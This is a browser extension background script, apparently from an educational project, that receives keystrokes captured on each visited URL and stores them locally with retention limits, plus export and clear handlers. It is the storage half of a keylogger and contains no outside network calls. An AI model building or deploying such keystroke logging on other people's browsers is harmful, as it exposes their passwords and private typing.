/**
 * ============================================================================
 * TypeSmart — Background Script (background.js)
 * ============================================================================
 *
 * Owner       : Member 3 — Background Script
 * Purpose     : Persistent background page that receives keystrokes from
 *               content.js and stores them locally using browser.storage.local.
 *
 * This version is 100% complete, educational, and local-only.
 * No external server. No real stealth. Everything stays on the user's computer.
 *
 * ============================================================================
 */

/* global TSConstants, Schema, browser */

// ---------------------------------------------------------------------------
// Shared references from shared/constants.js and shared/schema.js
// ---------------------------------------------------------------------------
const STORAGE_KEY = TSConstants.STORAGE_KEY;
const MSG_TYPES = TSConstants.MSG_TYPES;

// Maximum number of days to keep logs (educational limit)
const MAX_STORAGE_DAYS = 7;

// ===========================================================================
// Helper: Periodic cleanup (prevents storage from growing forever)
// ===========================================================================
async function cleanupOldLogs() {
  try {
    const result = await browser.storage.local.get(STORAGE_KEY);
    let entries = result[STORAGE_KEY] || [];

    const cutoff = Date.now() - (MAX_STORAGE_DAYS * 24 * 60 * 60 * 1000);
    entries = entries.filter(entry => {
      try {
        const parsed = Schema.deserializeEntry(entry);
        return parsed.timestamp > cutoff;
      } catch (e) {
        return false; // remove corrupted entries
      }
    });

    // keep maximum 2000 entries
    if (entries.length > 2000) {
      entries = entries.slice(-2000);
    }

    await browser.storage.local.set({ [STORAGE_KEY]: entries });
    console.log(`[TypeSmart bg] Cleanup done — ${entries.length} entries kept`);
  } catch (err) {
    console.error("[TypeSmart bg] Cleanup error:", err.message);
  }
}

// ===========================================================================
// Message Handlers
// ===========================================================================

async function handleLogKeys(payload, sendResponse) {
  try {
    const entry = Schema.deserializeEntry(payload);
    console.log("[TypeSmart bg] Received keystrokes for:", entry.url);

    const result = await browser.storage.local.get(STORAGE_KEY);
    let entries = result[STORAGE_KEY] || [];

    entries.push(payload);                    // store as serialized string

    await browser.storage.local.set({ [STORAGE_KEY]: entries });

    sendResponse({ success: true, count: entries.length });
  } catch (err) {
    console.error("[TypeSmart bg] handleLogKeys error:", err.message);
    sendResponse({ success: false, error: err.message });
  }
}

async function handleExport(sendResponse) {
  try {
    const result = await browser.storage.local.get(STORAGE_KEY);
    const entries = result[STORAGE_KEY] || [];
    sendResponse({ success: true, entries: entries });
  } catch (err) {
    console.error("[TypeSmart bg] handleExport error:", err.message);
    sendResponse({ success: false, error: err.message });
  }
}

async function handleClear(sendResponse) {
  try {
    await browser.storage.local.remove(STORAGE_KEY);
    console.log("[TypeSmart bg] All logs cleared ✓");
    sendResponse({ success: true });
  } catch (err) {
    console.error("[TypeSmart bg] handleClear error:", err.message);
    sendResponse({ success: false, error: err.message });
  }
}

async function handlePing(sendResponse) {
  try {
    const result = await browser.storage.local.get(STORAGE_KEY);
    const entries = result[STORAGE_KEY] || [];
    sendResponse({ status: "alive", entryCount: entries.length });
  } catch (err) {
    sendResponse({ status: "alive", entryCount: -1 });
  }
}

// ===========================================================================
// Central Message Router
// ===========================================================================
function onMessageRouter(message, sender, sendResponse) {
  console.log("[TypeSmart bg] Received message:", message.type);

  switch (message.type) {
    case MSG_TYPES.LOG_KEYS:
      handleLogKeys(message.payload, sendResponse);
      break;
    case MSG_TYPES.EXPORT:
      handleExport(sendResponse);
      break;
    case MSG_TYPES.CLEAR:
      handleClear(sendResponse);
      break;
    case MSG_TYPES.PING:
      handlePing(sendResponse);
      break;
    default:
      console.warn("[TypeSmart bg] Unknown message type:", message.type);
      sendResponse({ error: "Unknown message type: " + message.type });
  }

  return true; // keep sendResponse alive for async calls
}

// ===========================================================================
// Initialise Background Script
// ===========================================================================
function init() {
  browser.runtime.onMessage.addListener(onMessageRouter);

  console.log("%c[TypeSmart bg] Background script initialised ✓", "color: #00ff00; font-weight: bold");
  console.log("[TypeSmart bg] Listening for:", Object.values(MSG_TYPES));

  // Run cleanup when extension starts
  cleanupOldLogs();

  // Optional: run cleanup every hour
  setInterval(cleanupOldLogs, 60 * 60 * 1000);
}

// ---------------------------------------------------------------------------
// Start the background script
// ---------------------------------------------------------------------------
init();